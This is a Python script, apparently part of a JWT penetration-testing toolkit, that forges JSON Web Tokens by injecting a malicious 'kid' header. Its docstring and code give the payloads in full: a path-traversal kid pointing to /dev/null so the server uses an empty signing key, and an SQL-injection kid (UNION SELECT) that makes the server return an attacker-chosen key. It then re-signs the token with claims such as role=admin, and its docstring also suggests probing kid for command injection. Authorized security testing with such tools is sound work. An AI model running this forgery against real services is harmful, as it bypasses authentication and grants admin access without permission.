#!/usr/bin/env python3
"""
kid_injection.py — forge a token with a malicious `kid` header + HS signing with a chosen key
(guide §10).

Two common wins:
  1) Path traversal to an empty/known file (e.g. /dev/null) -> server loads an EMPTY key ->
     sign HS256 with secret "" (empty).   --kid "../../../../dev/null" --secret ""
  2) SQLi in kid returning a key you control -> sign HS256 with that key.
     --kid "x' UNION SELECT 'k'-- -" --secret "k"

Also useful for probing kid as a command-injection / LFI sink (set --kid to payloads and watch
responses), independent of forging.

AUTHORIZED TESTING ONLY. Forge into your own test account; never impersonate a real user.

Example:
  python3 kid_injection.py <TOKEN> --kid "../../../../dev/null" --secret "" --claim role=admin
"""
import argparse
from jwt_common import decode_token, build_token, apply_claims, pretty


def main():
    ap = argparse.ArgumentParser(description="Forge a token with a malicious kid header.")
    ap.add_argument("token")
    ap.add_argument("--kid", required=True, help="the kid value to inject")
    ap.add_argument("--secret", default="", help="HMAC secret matching the key the server will load (default empty)")
    ap.add_argument("--alg", default="HS256", help="HS256/HS384/HS512 (default HS256)")
    ap.add_argument("--claim", action="append", default=[], help="key=value (repeatable)")
    args = ap.parse_args()

    header, payload, _ = decode_token(args.token)
    header["kid"] = args.kid
    header["alg"] = args.alg
    payload = apply_claims(payload, args.claim)

    forged = build_token(header, payload, secret=args.secret.encode(), alg=args.alg)

    print("=== FORGED TOKEN (kid injected) ===")
    print(forged)
    print("\n=== DECODED ===")
    print(pretty(forged))
    print(f"\n[i] kid = {args.kid!r}  signed with secret = {args.secret!r}")
    print('    Common empty-key kids: ../../../../dev/null  /dev/null  file:///dev/null')


if __name__ == "__main__":
    main()
